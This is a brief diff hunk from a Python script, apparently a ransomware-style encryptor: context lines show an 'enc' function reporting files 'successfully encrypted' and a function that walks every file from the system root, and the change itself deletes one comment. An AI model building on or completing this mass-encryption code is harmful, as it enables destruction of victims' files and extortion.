@@ -42,7 +42,6 @@ def enc(filename, TargetedFile):
     print('File : ' + colored(TargetedFile, 'green') + ' successfully encrypted.')
 
 
-# getting every file on system
 def get_file():
     for r, d, f in os.walk(root):
         for file in f:
